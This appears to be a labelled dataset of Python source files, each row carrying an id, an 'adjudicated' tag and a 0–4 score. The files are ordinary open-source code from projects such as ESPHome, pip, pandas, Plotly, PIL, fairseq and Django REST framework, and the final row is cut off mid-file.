328	adjudicated	0	"from esphome.components import fan<<NEWL>>import esphome.config_validation as cv<<NEWL>>import esphome.codegen as cg<<NEWL>>from esphome.const import CONF_OUTPUT_ID, CONF_SPEED_COUNT, CONF_SWITCH_DATAPOINT<<NEWL>>from .. import tuya_ns, CONF_TUYA_ID, Tuya<<NEWL>><<NEWL>>DEPENDENCIES = [""tuya""]<<NEWL>><<NEWL>>CONF_SPEED_DATAPOINT = ""speed_datapoint""<<NEWL>>CONF_OSCILLATION_DATAPOINT = ""oscillation_datapoint""<<NEWL>>CONF_DIRECTION_DATAPOINT = ""direction_datapoint""<<NEWL>><<NEWL>>TuyaFan = tuya_ns.class_(""TuyaFan"", cg.Component, fan.Fan)<<NEWL>><<NEWL>>CONFIG_SCHEMA = cv.All(<<NEWL>>    fan.FAN_SCHEMA.extend(<<NEWL>>        {<<NEWL>>            cv.GenerateID(CONF_OUTPUT_ID): cv.declare_id(TuyaFan),<<NEWL>>            cv.GenerateID(CONF_TUYA_ID): cv.use_id(Tuya),<<NEWL>>            cv.Optional(CONF_OSCILLATION_DATAPOINT): cv.uint8_t,<<NEWL>>            cv.Optional(CONF_SPEED_DATAPOINT): cv.uint8_t,<<NEWL>>            cv.Optional(CONF_SWITCH_DATAPOINT): cv.uint8_t,<<NEWL>>            cv.Optional(CONF_DIRECTION_DATAPOINT): cv.uint8_t,<<NEWL>>            cv.Optional(CONF_SPEED_COUNT, default=3): cv.int_range(min=1, max=256),<<NEWL>>        }<<NEWL>>    ).extend(cv.COMPONENT_SCHEMA),<<NEWL>>    cv.has_at_least_one_key(CONF_SPEED_DATAPOINT, CONF_SWITCH_DATAPOINT),<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>async def to_code(config):<<NEWL>>    parent = await cg.get_variable(config[CONF_TUYA_ID])<<NEWL>><<NEWL>>    var = cg.new_Pvariable(config[CONF_OUTPUT_ID], parent, config[CONF_SPEED_COUNT])<<NEWL>>    await cg.register_component(var, config)<<NEWL>>    await fan.register_fan(var, config)<<NEWL>><<NEWL>>    if CONF_SPEED_DATAPOINT in config:<<NEWL>>        cg.add(var.set_speed_id(config[CONF_SPEED_DATAPOINT]))<<NEWL>>    if CONF_SWITCH_DATAPOINT in config:<<NEWL>>        cg.add(var.set_switch_id(config[CONF_SWITCH_DATAPOINT]))<<NEWL>>    if CONF_OSCILLATION_DATAPOINT in config:<<NEWL>>        cg.add(var.set_oscillation_id(config[CONF_OSCILLATION_DATAPOINT]))<<NEWL>>    if CONF_DIRECTION_DATAPOINT in config:<<NEWL>>        cg.add(var.set_direction_id(config[CONF_DIRECTION_DATAPOINT]))"
239	adjudicated	3	"# Copyright 2015 Google Inc. All rights reserved.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>># http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>""""""<<NEWL>>Sample App Engine application demonstrating how to use the Namespace Manager<<NEWL>>API with Datastore.<<NEWL>><<NEWL>>For more information, see README.md.<<NEWL>>""""""<<NEWL>><<NEWL>># [START all]<<NEWL>>from google.appengine.api import namespace_manager<<NEWL>>from google.appengine.ext import ndb<<NEWL>>import webapp2<<NEWL>><<NEWL>><<NEWL>>class Counter(ndb.Model):<<NEWL>>    count = ndb.IntegerProperty()<<NEWL>><<NEWL>><<NEWL>>@ndb.transactional<<NEWL>>def update_counter(name):<<NEWL>>    """"""Increment the named counter by 1.""""""<<NEWL>>    counter = Counter.get_by_id(name)<<NEWL>>    if counter is None:<<NEWL>>        counter = Counter(id=name, count=0)<<NEWL>><<NEWL>>    counter.count += 1<<NEWL>>    counter.put()<<NEWL>><<NEWL>>    return counter.count<<NEWL>><<NEWL>><<NEWL>>class DatastoreCounterHandler(webapp2.RequestHandler):<<NEWL>>    """"""Increments counters in the global namespace as well as in whichever<<NEWL>>    namespace is specified by the request, which is arbitrarily named 'default'<<NEWL>>    if not specified.""""""<<NEWL>><<NEWL>>    def get(self, namespace='default'):<<NEWL>>        global_count = update_counter('counter')<<NEWL>><<NEWL>>        # Save the current namespace.<<NEWL>>        previous_namespace = namespace_manager.get_namespace()<<NEWL>>        try:<<NEWL>>            namespace_manager.set_namespace(namespace)<<NEWL>>            namespace_count = update_counter('counter')<<NEWL>>        finally:<<NEWL>>            # Restore the saved namespace.<<NEWL>>            namespace_manager.set_namespace(previous_namespace)<<NEWL>><<NEWL>>        self.response.write('Global: {}, Namespace {}: {}'.format(<<NEWL>>            global_count, namespace, namespace_count))<<NEWL>><<NEWL>><<NEWL>>app = webapp2.WSGIApplication([<<NEWL>>    (r'/datastore', DatastoreCounterHandler),<<NEWL>>    (r'/datastore/(.*)', DatastoreCounterHandler)<<NEWL>>], debug=True)<<NEWL>># [END all]"
379	adjudicated	0	"from typing import Optional<<NEWL>><<NEWL>>from fastapi import Depends, Request<<NEWL>>from fastapi_users import BaseUserManager, FastAPIUsers, IntegerIDMixin<<NEWL>>from fastapi_users.authentication import AuthenticationBackend, BearerTransport, CookieTransport, JWTStrategy<<NEWL>>from fastapi_users.db import SQLAlchemyUserDatabase<<NEWL>><<NEWL>>import crud<<NEWL>>from app import models<<NEWL>>from app.deps import get_db<<NEWL>>from .db import User, get_user_db<<NEWL>>from .secrets import secrets<<NEWL>><<NEWL>>class UserManager(IntegerIDMixin, BaseUserManager[User, int]):<<NEWL>>    reset_password_token_secret = secrets['SECRET_KEY']<<NEWL>>    verification_token_secret = secrets['SECRET_KEY']<<NEWL>><<NEWL>>    async def on_after_register(self, user: User, request: Optional[Request] = None):<<NEWL>>        print(f""User {user.id} has registered."")<<NEWL>><<NEWL>>    async def on_after_forgot_password(<<NEWL>>        self, user: User, token: str, request: Optional[Request] = None<<NEWL>>    ):<<NEWL>>        print(f""User {user.id} has forgot their password. Reset token: {token}"")<<NEWL>><<NEWL>>    async def on_after_request_verify(<<NEWL>>        self, user: User, token: str, request: Optional[Request] = None<<NEWL>>    ):<<NEWL>>        print(f""Verification requested for user {user.id}. Verification token: {token}"")<<NEWL>><<NEWL>><<NEWL>>async def get_user_manager(user_db: SQLAlchemyUserDatabase = Depends(get_user_db)):<<NEWL>>    yield UserManager(user_db)<<NEWL>><<NEWL>><<NEWL>>bearer_transport = BearerTransport(tokenUrl=""auth/jwt/login"")<<NEWL>><<NEWL>><<NEWL>>def get_jwt_strategy() -> JWTStrategy:<<NEWL>>    return JWTStrategy(secret=secrets['SECRET_KEY'], lifetime_seconds=3600)<<NEWL>><<NEWL>><<NEWL>>jwt_auth_backend = AuthenticationBackend(<<NEWL>>    name=""jwt"",<<NEWL>>    transport=bearer_transport,<<NEWL>>    get_strategy=get_jwt_strategy,<<NEWL>>)<<NEWL>><<NEWL>>cookie_transport = CookieTransport(cookie_max_age=3600)<<NEWL>><<NEWL>>cookie_auth_backend = AuthenticationBackend(<<NEWL>>    name=""cookie"",<<NEWL>>    transport=cookie_transport,<<NEWL>>    get_strategy=get_jwt_strategy,<<NEWL>>)<<NEWL>><<NEWL>>fastapi_users = FastAPIUsers[User, int](get_user_manager, [jwt_auth_backend, cookie_auth_backend])<<NEWL>><<NEWL>>current_active_user = fastapi_users.current_user(active=True)<<NEWL>><<NEWL>>async def get_current_profile(user: User = Depends(current_active_user), db = Depends(get_db)):<<NEWL>>    profile = await crud.read(_id=user.id, db=db, model=models.Profile)<<NEWL>>    return profile"
437	adjudicated	3	"import sys<<NEWL>>import platform<<NEWL>><<NEWL>><<NEWL>>__all__ = ['install', 'NullFinder', 'Protocol']<<NEWL>><<NEWL>><<NEWL>>try:<<NEWL>>    from typing import Protocol<<NEWL>>except ImportError:  # pragma: no cover<<NEWL>>    # Python 3.7 compatibility<<NEWL>>    from ..typing_extensions import Protocol  # type: ignore<<NEWL>><<NEWL>><<NEWL>>def install(cls):<<NEWL>>    """"""<<NEWL>>    Class decorator for installation on sys.meta_path.<<NEWL>><<NEWL>>    Adds the backport DistributionFinder to sys.meta_path and<<NEWL>>    attempts to disable the finder functionality of the stdlib<<NEWL>>    DistributionFinder.<<NEWL>>    """"""<<NEWL>>    sys.meta_path.append(cls())<<NEWL>>    disable_stdlib_finder()<<NEWL>>    return cls<<NEWL>><<NEWL>><<NEWL>>def disable_stdlib_finder():<<NEWL>>    """"""<<NEWL>>    Give the backport primacy for discovering path-based distributions<<NEWL>>    by monkey-patching the stdlib O_O.<<NEWL>><<NEWL>>    See #91 for more background for rationale on this sketchy<<NEWL>>    behavior.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def matches(finder):<<NEWL>>        return getattr(<<NEWL>>            finder, '__module__', None<<NEWL>>        ) == '_frozen_importlib_external' and hasattr(finder, 'find_distributions')<<NEWL>><<NEWL>>    for finder in filter(matches, sys.meta_path):  # pragma: nocover<<NEWL>>        del finder.find_distributions<<NEWL>><<NEWL>><<NEWL>>class NullFinder:<<NEWL>>    """"""<<NEWL>>    A ""Finder"" (aka ""MetaClassFinder"") that never finds any modules,<<NEWL>>    but may find distributions.<<NEWL>>    """"""<<NEWL>><<NEWL>>    @staticmethod<<NEWL>>    def find_spec(*args, **kwargs):<<NEWL>>        return None<<NEWL>><<NEWL>>    # In Python 2, the import system requires finders<<NEWL>>    # to have a find_module() method, but this usage<<NEWL>>    # is deprecated in Python 3 in favor of find_spec().<<NEWL>>    # For the purposes of this finder (i.e. being present<<NEWL>>    # on sys.meta_path but having no other import<<NEWL>>    # system functionality), the two methods are identical.<<NEWL>>    find_module = find_spec<<NEWL>><<NEWL>><<NEWL>>def pypy_partial(val):<<NEWL>>    """"""<<NEWL>>    Adjust for variable stacklevel on partial under PyPy.<<NEWL>><<NEWL>>    Workaround for #327.<<NEWL>>    """"""<<NEWL>>    is_pypy = platform.python_implementation() == 'PyPy'<<NEWL>>    return val + is_pypy"
466	adjudicated	1	"import argparse<<NEWL>>import unittest<<NEWL>>from typing import Any, Dict, Sequence<<NEWL>><<NEWL>>import torch<<NEWL>>from fairseq.models import transformer<<NEWL>><<NEWL>>from tests.test_roberta import FakeTask<<NEWL>><<NEWL>><<NEWL>>def mk_sample(tok: Sequence[int] = None, batch_size: int = 2) -> Dict[str, Any]:<<NEWL>>    if not tok:<<NEWL>>        tok = [10, 11, 12, 13, 14, 15, 2]<<NEWL>><<NEWL>>    batch = torch.stack([torch.tensor(tok, dtype=torch.long)] * batch_size)<<NEWL>>    sample = {<<NEWL>>        ""net_input"": {<<NEWL>>            ""src_tokens"": batch,<<NEWL>>            ""prev_output_tokens"": batch,<<NEWL>>            ""src_lengths"": torch.tensor(<<NEWL>>                [len(tok)] * batch_size, dtype=torch.long, device=batch.device<<NEWL>>            ),<<NEWL>>        },<<NEWL>>        ""target"": batch[:, 1:],<<NEWL>>    }<<NEWL>>    return sample<<NEWL>><<NEWL>><<NEWL>>def mk_transformer(**extra_args: Any):<<NEWL>>    overrides = {<<NEWL>>        # Use characteristics dimensions<<NEWL>>        ""encoder_embed_dim"": 12,<<NEWL>>        ""encoder_ffn_embed_dim"": 14,<<NEWL>>        ""decoder_embed_dim"": 12,<<NEWL>>        ""decoder_ffn_embed_dim"": 14,<<NEWL>>        # Disable dropout so we have comparable tests.<<NEWL>>        ""dropout"": 0,<<NEWL>>        ""attention_dropout"": 0,<<NEWL>>        ""activation_dropout"": 0,<<NEWL>>        ""encoder_layerdrop"": 0,<<NEWL>>    }<<NEWL>>    overrides.update(extra_args)<<NEWL>>    # Overrides the defaults from the parser<<NEWL>>    args = argparse.Namespace(**overrides)<<NEWL>>    transformer.tiny_architecture(args)<<NEWL>><<NEWL>>    torch.manual_seed(0)<<NEWL>>    task = FakeTask(args)<<NEWL>>    return transformer.TransformerModel.build_model(args, task)<<NEWL>><<NEWL>><<NEWL>>class TransformerTestCase(unittest.TestCase):<<NEWL>>    def test_forward_backward(self):<<NEWL>>        model = mk_transformer(encoder_embed_dim=12, decoder_embed_dim=12)<<NEWL>>        sample = mk_sample()<<NEWL>>        o, _ = model.forward(**sample[""net_input""])<<NEWL>>        loss = o.sum()<<NEWL>>        loss.backward()<<NEWL>><<NEWL>>    def test_different_encoder_decoder_embed_dim(self):<<NEWL>>        model = mk_transformer(encoder_embed_dim=12, decoder_embed_dim=16)<<NEWL>>        sample = mk_sample()<<NEWL>>        o, _ = model.forward(**sample[""net_input""])<<NEWL>>        loss = o.sum()<<NEWL>>        loss.backward()"
452	adjudicated	3	"import os<<NEWL>>import string<<NEWL>>import urllib.parse<<NEWL>>import urllib.request<<NEWL>>from typing import Optional<<NEWL>><<NEWL>>from .compat import WINDOWS<<NEWL>><<NEWL>><<NEWL>>def get_url_scheme(url):<<NEWL>>    # type: (str) -> Optional[str]<<NEWL>>    if "":"" not in url:<<NEWL>>        return None<<NEWL>>    return url.split("":"", 1)[0].lower()<<NEWL>><<NEWL>><<NEWL>>def path_to_url(path):<<NEWL>>    # type: (str) -> str<<NEWL>>    """"""<<NEWL>>    Convert a path to a file: URL.  The path will be made absolute and have<<NEWL>>    quoted path parts.<<NEWL>>    """"""<<NEWL>>    path = os.path.normpath(os.path.abspath(path))<<NEWL>>    url = urllib.parse.urljoin(""file:"", urllib.request.pathname2url(path))<<NEWL>>    return url<<NEWL>><<NEWL>><<NEWL>>def url_to_path(url):<<NEWL>>    # type: (str) -> str<<NEWL>>    """"""<<NEWL>>    Convert a file: URL to a path.<<NEWL>>    """"""<<NEWL>>    assert url.startswith(<<NEWL>>        ""file:""<<NEWL>>    ), f""You can only turn file: urls into filenames (not {url!r})""<<NEWL>><<NEWL>>    _, netloc, path, _, _ = urllib.parse.urlsplit(url)<<NEWL>><<NEWL>>    if not netloc or netloc == ""localhost"":<<NEWL>>        # According to RFC 8089, same as empty authority.<<NEWL>>        netloc = """"<<NEWL>>    elif WINDOWS:<<NEWL>>        # If we have a UNC path, prepend UNC share notation.<<NEWL>>        netloc = ""\\\\"" + netloc<<NEWL>>    else:<<NEWL>>        raise ValueError(<<NEWL>>            f""non-local file URIs are not supported on this platform: {url!r}""<<NEWL>>        )<<NEWL>><<NEWL>>    path = urllib.request.url2pathname(netloc + path)<<NEWL>><<NEWL>>    # On Windows, urlsplit parses the path as something like ""/C:/Users/foo"".<<NEWL>>    # This creates issues for path-related functions like io.open(), so we try<<NEWL>>    # to detect and strip the leading slash.<<NEWL>>    if (<<NEWL>>        WINDOWS<<NEWL>>        and not netloc  # Not UNC.<<NEWL>>        and len(path) >= 3<<NEWL>>        and path[0] == ""/""  # Leading slash to strip.<<NEWL>>        and path[1] in string.ascii_letters  # Drive letter.<<NEWL>>        and path[2:4] in ("":"", "":/"")  # Colon + end of string, or colon + absolute path.<<NEWL>>    ):<<NEWL>>        path = path[1:]<<NEWL>><<NEWL>>    return path"
512	adjudicated	0	"# -*- coding: utf-8 -*-<<NEWL>><<NEWL>># Copyright 2010 Dirk Holtwick, holtwick.it<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>import six<<NEWL>>import logging<<NEWL>><<NEWL>><<NEWL>>from xhtml2pdf.util import pisaTempFile, getFile, PyPDF2<<NEWL>><<NEWL>><<NEWL>>log = logging.getLogger(""xhtml2pdf"")<<NEWL>><<NEWL>><<NEWL>>class pisaPDF:<<NEWL>>    def __init__(self, capacity=-1):<<NEWL>>        self.capacity = capacity<<NEWL>>        self.files = []<<NEWL>><<NEWL>>    def addFromURI(self, url, basepath=None):<<NEWL>>        obj = getFile(url, basepath)<<NEWL>>        if obj and (not obj.notFound()):<<NEWL>>            self.files.append(obj.getFile())<<NEWL>><<NEWL>>    addFromFileName = addFromURI<<NEWL>><<NEWL>>    def addFromFile(self, f):<<NEWL>>        if hasattr(f, ""read""):<<NEWL>>            self.files.append(f)<<NEWL>>        else:<<NEWL>>            self.addFromURI(f)<<NEWL>><<NEWL>>    def addFromString(self, data):<<NEWL>>        self.files.append(pisaTempFile(data, capacity=self.capacity))<<NEWL>><<NEWL>>    def addDocument(self, doc):<<NEWL>>        if hasattr(doc.dest, ""read""):<<NEWL>>            self.files.append(doc.dest)<<NEWL>><<NEWL>>    def join(self, file=None):<<NEWL>>        output = PyPDF2.PdfFileWriter()<<NEWL>>        for pdffile in self.files:<<NEWL>>            input = PyPDF2.PdfFileReader(pdffile)<<NEWL>>            for pageNumber in six.moves.range(input.getNumPages()):<<NEWL>>                output.addPage(input.getPage(pageNumber))<<NEWL>><<NEWL>>        if file is not None:<<NEWL>>            output.write(file)<<NEWL>>            return file<<NEWL>>        out = pisaTempFile(capacity=self.capacity)<<NEWL>>        output.write(out)<<NEWL>>        return out.getvalue()<<NEWL>><<NEWL>>    getvalue = join<<NEWL>>    __str__ = join"
403	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""hoverlabel"", parent_name=""box"", **kwargs):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
51	adjudicated	4	"""""""<<NEWL>>Unopinionated display configuration.<<NEWL>>""""""<<NEWL>><<NEWL>>from __future__ import annotations<<NEWL>><<NEWL>>import locale<<NEWL>>import sys<<NEWL>><<NEWL>>from pandas._config import config as cf<<NEWL>><<NEWL>># -----------------------------------------------------------------------------<<NEWL>># Global formatting options<<NEWL>>_initial_defencoding: str | None = None<<NEWL>><<NEWL>><<NEWL>>def detect_console_encoding() -> str:<<NEWL>>    """"""<<NEWL>>    Try to find the most capable encoding supported by the console.<<NEWL>>    slightly modified from the way IPython handles the same issue.<<NEWL>>    """"""<<NEWL>>    global _initial_defencoding<<NEWL>><<NEWL>>    encoding = None<<NEWL>>    try:<<NEWL>>        encoding = sys.stdout.encoding or sys.stdin.encoding<<NEWL>>    except (AttributeError, OSError):<<NEWL>>        pass<<NEWL>><<NEWL>>    # try again for something better<<NEWL>>    if not encoding or ""ascii"" in encoding.lower():<<NEWL>>        try:<<NEWL>>            encoding = locale.getpreferredencoding()<<NEWL>>        except locale.Error:<<NEWL>>            # can be raised by locale.setlocale(), which is<<NEWL>>            #  called by getpreferredencoding<<NEWL>>            #  (on some systems, see stdlib locale docs)<<NEWL>>            pass<<NEWL>><<NEWL>>    # when all else fails. this will usually be ""ascii""<<NEWL>>    if not encoding or ""ascii"" in encoding.lower():<<NEWL>>        encoding = sys.getdefaultencoding()<<NEWL>><<NEWL>>    # GH#3360, save the reported defencoding at import time<<NEWL>>    # MPL backends may change it. Make available for debugging.<<NEWL>>    if not _initial_defencoding:<<NEWL>>        _initial_defencoding = sys.getdefaultencoding()<<NEWL>><<NEWL>>    return encoding<<NEWL>><<NEWL>><<NEWL>>pc_encoding_doc = """"""<<NEWL>>: str/unicode<<NEWL>>    Defaults to the detected encoding of the console.<<NEWL>>    Specifies the encoding to be used for strings returned by to_string,<<NEWL>>    these are generally strings meant to be displayed on the console.<<NEWL>>""""""<<NEWL>><<NEWL>>with cf.config_prefix(""display""):<<NEWL>>    cf.register_option(<<NEWL>>        ""encoding"", detect_console_encoding(), pc_encoding_doc, validator=cf.is_text<<NEWL>>    )"
280	adjudicated	3	"from django.urls import get_script_prefix, resolve<<NEWL>><<NEWL>><<NEWL>>def get_breadcrumbs(url, request=None):<<NEWL>>    """"""<<NEWL>>    Given a url returns a list of breadcrumbs, which are each a<<NEWL>>    tuple of (name, url).<<NEWL>>    """"""<<NEWL>>    from rest_framework.reverse import preserve_builtin_query_params<<NEWL>>    from rest_framework.views import APIView<<NEWL>><<NEWL>>    def breadcrumbs_recursive(url, breadcrumbs_list, prefix, seen):<<NEWL>>        """"""<<NEWL>>        Add tuples of (name, url) to the breadcrumbs list,<<NEWL>>        progressively chomping off parts of the url.<<NEWL>>        """"""<<NEWL>>        try:<<NEWL>>            (view, unused_args, unused_kwargs) = resolve(url)<<NEWL>>        except Exception:<<NEWL>>            pass<<NEWL>>        else:<<NEWL>>            # Check if this is a REST framework view,<<NEWL>>            # and if so add it to the breadcrumbs<<NEWL>>            cls = getattr(view, ""cls"", None)<<NEWL>>            initkwargs = getattr(view, ""initkwargs"", {})<<NEWL>>            if cls is not None and issubclass(cls, APIView):<<NEWL>>                # Don't list the same view twice in a row.<<NEWL>>                # Probably an optional trailing slash.<<NEWL>>                if not seen or seen[-1] != view:<<NEWL>>                    c = cls(**initkwargs)<<NEWL>>                    name = c.get_view_name()<<NEWL>>                    insert_url = preserve_builtin_query_params(prefix + url, request)<<NEWL>>                    breadcrumbs_list.insert(0, (name, insert_url))<<NEWL>>                    seen.append(view)<<NEWL>><<NEWL>>        if url == """":<<NEWL>>            # All done<<NEWL>>            return breadcrumbs_list<<NEWL>><<NEWL>>        elif url.endswith(""/""):<<NEWL>>            # Drop trailing slash off the end and continue to try to<<NEWL>>            # resolve more breadcrumbs<<NEWL>>            url = url.rstrip(""/"")<<NEWL>>            return breadcrumbs_recursive(url, breadcrumbs_list, prefix, seen)<<NEWL>><<NEWL>>        # Drop trailing non-slash off the end and continue to try to<<NEWL>>        # resolve more breadcrumbs<<NEWL>>        url = url[: url.rfind(""/"") + 1]<<NEWL>>        return breadcrumbs_recursive(url, breadcrumbs_list, prefix, seen)<<NEWL>><<NEWL>>    prefix = get_script_prefix().rstrip(""/"")<<NEWL>>    url = url[len(prefix) :]<<NEWL>>    return breadcrumbs_recursive(url, [], prefix, [])"
111	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""textfont"", parent_name=""funnelarea"", **kwargs):<<NEWL>>        super(TextfontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
391	adjudicated	1	"#<<NEWL>># The Python Imaging Library.<<NEWL>># $Id$<<NEWL>>#<<NEWL>># XV Thumbnail file handler by Charles E. ""Gene"" Cash<<NEWL>># (gcash@magicnet.net)<<NEWL>>#<<NEWL>># see xvcolor.c and xvbrowse.c in the sources to John Bradley's XV,<<NEWL>># available from ftp://ftp.cis.upenn.edu/pub/xv/<<NEWL>>#<<NEWL>># history:<<NEWL>># 98-08-15 cec  created (b/w only)<<NEWL>># 98-12-09 cec  added color palette<<NEWL>># 98-12-28 fl   added to PIL (with only a few very minor modifications)<<NEWL>>#<<NEWL>># To do:<<NEWL>># FIXME: make save work (this requires quantization support)<<NEWL>>#<<NEWL>><<NEWL>>from . import Image, ImageFile, ImagePalette<<NEWL>>from ._binary import o8<<NEWL>><<NEWL>>_MAGIC = b""P7 332""<<NEWL>><<NEWL>># standard color palette for thumbnails (RGB332)<<NEWL>>PALETTE = b""""<<NEWL>>for r in range(8):<<NEWL>>    for g in range(8):<<NEWL>>        for b in range(4):<<NEWL>>            PALETTE = PALETTE + (<<NEWL>>                o8((r * 255) // 7) + o8((g * 255) // 7) + o8((b * 255) // 3)<<NEWL>>            )<<NEWL>><<NEWL>><<NEWL>>def _accept(prefix):<<NEWL>>    return prefix[:6] == _MAGIC<<NEWL>><<NEWL>><<NEWL>>##<<NEWL>># Image plugin for XV thumbnail images.<<NEWL>><<NEWL>><<NEWL>>class XVThumbImageFile(ImageFile.ImageFile):<<NEWL>><<NEWL>>    format = ""XVThumb""<<NEWL>>    format_description = ""XV thumbnail image""<<NEWL>><<NEWL>>    def _open(self):<<NEWL>><<NEWL>>        # check magic<<NEWL>>        if not _accept(self.fp.read(6)):<<NEWL>>            msg = ""not an XV thumbnail file""<<NEWL>>            raise SyntaxError(msg)<<NEWL>><<NEWL>>        # Skip to beginning of next line<<NEWL>>        self.fp.readline()<<NEWL>><<NEWL>>        # skip info comments<<NEWL>>        while True:<<NEWL>>            s = self.fp.readline()<<NEWL>>            if not s:<<NEWL>>                msg = ""Unexpected EOF reading XV thumbnail file""<<NEWL>>                raise SyntaxError(msg)<<NEWL>>            if s[0] != 35:  # ie. when not a comment: '#'<<NEWL>>                break<<NEWL>><<NEWL>>        # parse header line (already read)<<NEWL>>        s = s.strip().split()<<NEWL>><<NEWL>>        self.mode = ""P""<<NEWL>>        self._size = int(s[0]), int(s[1])<<NEWL>><<NEWL>>        self.palette = ImagePalette.raw(""RGB"", PALETTE)<<NEWL>><<NEWL>>        self.tile = [(""raw"", (0, 0) + self.size, self.fp.tell(), (self.mode, 0, 1))]<<NEWL>><<NEWL>><<NEWL>># --------------------------------------------------------------------<<NEWL>><<NEWL>>Image.register_open(XVThumbImageFile.format, XVThumbImageFile, _accept)"
140	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""font"", parent_name=""bar.hoverlabel"", **kwargs):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                